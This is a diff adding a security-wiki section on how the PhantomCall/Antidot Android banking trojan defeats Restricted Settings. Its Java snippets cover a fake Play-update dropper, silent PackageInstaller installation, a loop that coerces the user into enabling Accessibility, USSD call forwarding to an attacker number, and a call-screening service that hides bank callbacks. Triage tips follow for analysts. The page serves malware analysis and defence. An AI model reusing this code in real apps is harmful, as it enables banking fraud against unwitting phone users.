@@ -222,7 +222,135 @@ public void onMessageReceived(RemoteMessage msg){
 
 ---
 
+## Android 13+ Restricted Settings bypass, Accessibility coercion and telephony isolation (PhantomCall/Antidot pattern)
+
+Banking malware campaigns distributed via smishing/rogue ads increasingly avoid Google Play and rely on sideloaded APKs. From Android 13 onward, Restricted Settings make it harder for sideloaded apps to get Accessibility enabled. Operators now mimic the Play Store install flow with a dropper + payload architecture and abuse legitimate platform APIs for post‑install coercion and call isolation.
+
+### 1) Installer‑flow mimicry to bypass Restricted Settings
+
+Goal: move the victim to Settings → “Install unknown apps” for the fake package, then install the real payload silently via PackageInstaller.Session to emulate Play behaviour (instead of using Intent.ACTION_INSTALL_PACKAGE).
+
+- WebView “update” page + JavaScript bridge to open the system screen for unknown sources:
+
+```java
+// Bind a JS bridge to a fake Google Play WebView page
+webView.getSettings().setJavaScriptEnabled(true);
+webView.addJavascriptInterface(new Object(){
+  @JavascriptInterface
+  public void onUpdateClicked(){
+    // Open: Settings → Install unknown apps for this package (fake Chrome)
+    Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
+        .setData(Uri.parse("package:" + getPackageName()));
+    startActivity(i);
+  }
+}, "bridge");
+```
+
+- Gate on “Install unknown apps” using PackageManager.canRequestPackageInstalls(). Keep showing the fake update page until granted, then stream the Trojan APK bytes through a PackageInstaller.Session:
+
+```java
+@Override
+protected void onResume(){
+  boolean allowed = getPackageManager().canRequestPackageInstalls();
+  if (!allowed){
+    showFakePlayUpdate(); // WebView with JS bridge above
+    return;
+  }
+  installPayloadFromBytes(apkBytes);
+}
+
+private void installPayloadFromBytes(byte[] apk){
+  PackageInstaller pi = getPackageManager().getPackageInstaller();
+  PackageInstaller.SessionParams params =
+      new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+  int sessionId = pi.createSession(params);
+  try (PackageInstaller.Session s = pi.openSession(sessionId);
+       OutputStream os = s.openWrite("base.apk", 0, apk.length)){
+    os.write(apk);
+    s.fsync(os);
+    PendingIntent result = PendingIntent.getBroadcast(this, 0, new Intent("install.result"), 0);
+    s.commit(result.getIntentSender());
+  } catch (Exception e){ /* handle */ }
+}
+```
+
+Why this works: using the session‑based flow closely matches the Play Store install UX and avoids the sideloaded‑installer friction associated with ACTION_INSTALL_PACKAGE. The dropper only needs the user to toggle “Install unknown apps” once.
+
+### 2) Persistent Accessibility coercion
+
+After the payload (banking Trojan) is installed, the dropper keeps running and “drives” the user to enable the payload’s Accessibility service. It polls the active services and, if the target service is missing, foregrounds the payload UI to pressure the user until enabled.
+
+```java
+// Coercion loop (simplified)
+AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
+PackageManager pm = getPackageManager();
+List<AccessibilityServiceInfo> enabled =
+    am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+boolean active = false;
+for (AccessibilityServiceInfo si : enabled){
+  CharSequence label = si.getResolveInfo().loadLabel(pm);
+  if (label != null && label.toString().equals("<TargetServiceLabel>")) { active = true; break; }
+}
+if (!active){
+  // Bring malware main activity to front to urge enabling Accessibility
+  startActivity(new Intent().setComponent(new ComponentName("mal.pkg","mal.pkg.MainActivity"))
+      .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+}
+```
+
+See also Accessibility abuse details and hardening: [Android Accessibility Service Abuse](../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md).
+
+### 3) Telephony isolation for stealthy fraud
+
+Once Accessibility is active, the payload isolates the victim from bank/support callbacks to delay detection:
+
+- USSD‑based call forwarding: dispatch USSD codes to configure call forwarding to attacker numbers.
+
+```java
+TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+tm.sendUssdRequest("*21*<attacker_number>#", new TelephonyManager.UssdResponseCallback(){}, new Handler());
+```
+
+- CallScreeningService‑based blocking: implement a CallScreeningService which matches incoming numbers by postfix from a C2‑provided list stored in SharedPreferences, then suppresses UI, log and notifications for matched calls.
+
+```java
+public class Blocker extends CallScreeningService {
+  @Override
+  public void onScreenCall(Call.Details d){
+    String incoming = d.getHandle().getSchemeSpecificPart();
+    Set<String> postfixes = prefs.getStringSet("c2_numbers", Collections.emptySet());
+    if (matchesPostfix(incoming, postfixes)){
+      respondToCall(d, new CallResponse.Builder()
+        .setDisallowCall(true)
+        .setSilenceCall(true)
+        .setSkipCallLog(true)
+        .setSkipNotification(true)
+        .build());
+    }
+  }
+}
+```
+
+This combination (forward legitimate callbacks away and block the rest locally) keeps the victim unaware while operators complete high‑value transactions via Accessibility automation.
+
+### Hunting and triage tips
+
+- Search for strings/classes: PackageInstaller.Session, canRequestPackageInstalls, ACTION_MANAGE_UNKNOWN_APP_SOURCES, addJavascriptInterface/@JavascriptInterface, AccessibilityManager.getEnabledAccessibilityServiceList, CallScreeningService, sendUssdRequest, SharedPreferences number lists.
+- Hook startActivity and PackageInstaller APIs with Frida to observe the install + coercion chain during dynamic analysis.
+- Monitor Settings changes for “Install unknown apps”, default call‑screening app, and sudden call‑forwarding USSD requests.
+
+
 ## References
+
+- [PhantomCall unmasked: An Antidot variant disguised as fake Chrome apps (IBM Trusteer Labs)](https://www.ibm.com/think/news/phantomcall-antidot-variant-in-fake-chrome-apps)
+- [Android API — PackageInstaller.Session](https://developer.android.com/reference/android/content/pm/PackageInstaller.Session)
+- [Android API — PackageManager.canRequestPackageInstalls()](https://developer.android.com/reference/android/content/pm/PackageManager#canRequestPackageInstalls())
+- [Android API — AccessibilityManager.getEnabledAccessibilityServiceList(int)](https://developer.android.com/reference/android/view/accessibility/AccessibilityManager#getEnabledAccessibilityServiceList(int))
+- [Android API — CallScreeningService](https://developer.android.com/reference/android/telecom/CallScreeningService)
+- [Android API — TelephonyManager.sendUssdRequest](https://developer.android.com/reference/android/telephony/TelephonyManager#sendUssdRequest(java.lang.String,%20android.telephony.TelephonyManager.UssdResponseCallback,%20android.os.Handler))
+- [Google Play policy — AccessibilityServices restrictions](https://support.google.com/googleplay/android-developer/answer/10964491?hl=en)
+- [Google Security Blog — How we fought bad apps and developers in 2021](https://security.googleblog.com/2022/04/how-we-fought-bad-apps-and-developers.html)
+- [Antidot banking trojan masquerading as Google Play updates (Cyble)](https://cyble.com/blog/new-antidot-android-banking-trojan-masquerading-as-google-play-updates/)
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
